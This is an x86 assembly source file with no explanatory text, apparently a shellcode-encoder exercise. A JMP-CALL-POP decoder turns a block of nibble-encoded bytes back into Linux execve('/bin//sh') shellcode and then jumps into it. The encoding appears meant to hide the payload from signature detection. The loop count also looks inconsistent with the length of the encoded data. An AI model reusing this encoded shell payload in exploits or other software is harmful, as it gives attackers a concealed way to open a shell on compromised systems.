global _start
_start:
	jmp jocker

	loader:
		pop    esi
		mov    edi,esi
		xor    ecx,ecx
		mov    cl,0x2a

	decrypt:
		mov    ah, [esi]
		mov    al, [esi+0x1]
		sub    al,0x41
		sub    ah,0x41
		shl    ah,0x4
		add    al,ah
		mov    [edi],al
		inc    esi
		inc    esi
		inc    edi
		loop   decrypt
		jmp    cipher

	jocker:
		call   loader

	cipher:
		db 044H
		db 042H  
		db 04dH  
		db 04aH  
		db 046H  
		db 042H
		db 047H  
		db 049H  
		db 043H  
		db 050H  
		db 043H  
		db 050H  
		db 048H  
		db 044H  
		db 047H  
		db 049H  
		db 047H  
		db 049H  
		db 043H 
		db 050H  
		db 047H  
		db 043H  
		db 047H  
		db 04aH 
		db 047H  
		db 04fH  
		db 049H  
		db 04aH  
		db 04fH  
		db 044H  
		db 047H  
		db 04bH  
		db 041H  
		db 04cH  
		db 046H  
		db 049H  
		db 04aH  
		db 04aH  
		db 04dH  
		db 04eH  
		db 049H
		db 041H

